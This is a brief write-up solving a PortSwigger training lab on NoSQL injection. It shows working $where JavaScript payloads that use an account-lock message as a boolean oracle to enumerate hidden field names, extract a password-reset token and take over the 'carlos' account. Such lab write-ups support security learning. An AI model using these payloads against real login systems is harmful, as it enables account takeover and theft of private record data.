# Lab 04 — Exploiting NoSQL operator injection to extract unknown fields

> **Expert** · [Official lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)

**Entry point:** `POST /login` — the goal is the password-reset **token**
field, whose name you don't know, via `$where` JavaScript injection.

## Solution

1. Probe with `{"$ne":""}` operators — the account-lock behavior gives a
   boolean oracle (locked message = valid username + wrong password).
2. Switch to `$where` (JavaScript) to inspect document keys:

```json
{"username":"carlos","password":{"$where":"Object.keys(this)[0].match('^.{0}c.*')"}}
```

Enumerate `Object.keys(this)` positions (0,1,2...) and characters until the
oracle identifies field names — one of them is the reset token field
(e.g. `passwordResetToken`).

3. Extract the token's value the same way:

```json
{"username":"carlos","password":{"$where":"this.passwordResetToken.match('^.{0}a.*')"}}
```

(Intruder: position per character, payloads `a-z0-9`, oracle = no lock
message.)

4. Rebuild the token, then request `/forgot-password?temp-forgot-password-token=<TOKEN>`
   with `username=carlos` to set a new password — log in — lab solved.

## Notes

`$where` executes real JavaScript per document — it can read anything in
the record, including fields the API never returns.
